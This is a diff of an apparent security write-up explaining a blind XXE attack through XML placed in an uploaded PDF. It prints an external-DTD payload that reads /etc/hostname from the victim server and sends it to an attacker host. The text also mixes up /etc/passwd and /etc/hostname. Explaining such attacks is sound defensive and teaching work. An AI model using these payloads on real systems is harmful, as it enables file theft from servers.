@@ -81,20 +81,13 @@ I had to try different variations of External Parameter entities (an entity refe
 <root>&data;</root>
 ```
 
-Content of the malicious DTD (poc.dtd):
-
-```xml
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">
-```
-
-Here's the breakout from all of this:
+Let's break it down a bit...
 
 The first payload is what I inserted in the PDF file:
 
 1. `<!ENTITY % ext SYSTEM "https://<attacker-server>/poc.dtd">`: This line defines a parameter entity named `%ext`. Parameter entities are used within the DTD itself. It instructs the XML parser to fetch the content from the remote URL `https://attacker-server/poc.dtd`.
 
-2. <b>%ext;</b>: This immediately triggers the parser to process the fetched DTD file.
+2. `%ext;`: This immediately triggers the parser to process the fetched DTD file.
 
 At this point, the vulnerable server makes an outbound HTTP request to the attacker's server to download poc.dtd. 
 
@@ -104,15 +97,15 @@ The <b>poc.dtd</b> file, hosted on the attacker's server, contains the actual ex
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">
 ```
-3. `<!ENTITY % file SYSTEM "file:///etc/passwd">`: The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the <code>/etc/hostname</code> file from the victim server's filesystem.
+3. `<!ENTITY % file SYSTEM "file:///etc/passwd">`: The parser reads this line from the remote DTD. It defines another parameter entity, <b>%file></b>, which is instructed to read the contents of the <code>/etc/hostname</code> file from the victim server's filesystem.
 
 4. `<!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">`: This is a nested entity. It defines a parameter entity <b>%ent</b> whose value is the full declaration for a general entity named <b>data</b>. This part is key because it ensures the file content (%file) is read and included within the URL of the final call.
 
 
 Back in the initial payload:
-5. %ent;: This line (3rd) triggers the processing of the %ent entity from the remote DTD, in simple terms, this action brings the final, exfil command (&data;) into existence, setting up the last step of the attack.
+5. %ent;: This line (3rd) triggers the processing of the %ent entity from the remote DTD, in simple terms, this action brings the final, exfil command (`&data;`) into existence, setting up the last step of the attack.
 
-6. `<root>&data;</root`>: The parser now resolves the &data; general entity. As per its definition, this triggers a final HTTP request to https://warned-strengthening-vinyl-estate.trycloudflare.com/. Crucially, the content of the /etc/passwd file is appended as a URL parameter (?x=%file;), and the server sends this request, thereby exfiltrating the data to the attacker's controlled domain.
+6. `<root>&data;</root`>: The parser now resolves the `&data;` general entity. This triggers a final HTTP request to `https://attacker-server`. The content of the `/etc/passwd` file is appended as a URL parameter (`?x=%file;`), and the server sends this request, successfully exfiltrating the data to the attacker's controlled domain.
 
 
 
